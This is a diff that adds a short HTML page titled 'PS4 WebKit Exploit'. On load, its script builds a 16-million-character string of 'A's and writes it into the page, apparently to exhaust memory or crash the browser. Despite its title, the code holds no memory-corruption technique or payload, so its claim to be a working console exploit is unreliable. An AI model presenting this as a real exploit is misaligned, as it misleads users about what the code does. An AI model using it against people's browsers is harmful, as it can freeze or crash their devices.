@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PS4 WebKit Exploit</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        #exploit { width: 100%; height: 100%; position: absolute; top: 0; left: 0; }
+    </style>
+</head>
+<body>
+    <div id="exploit"></div>
+    <script>
+        function triggerExploit() {
+            var exploitDiv = document.getElementById('exploit');
+            var largeArray = new Array(0x1000000);
+            for (var i = 0; i < largeArray.length; i++) {
+                largeArray[i] = 'A';
+            }
+            exploitDiv.innerHTML = largeArray.join('');
+        }
+        triggerExploit();
+    </script>
+</body>
+</html>
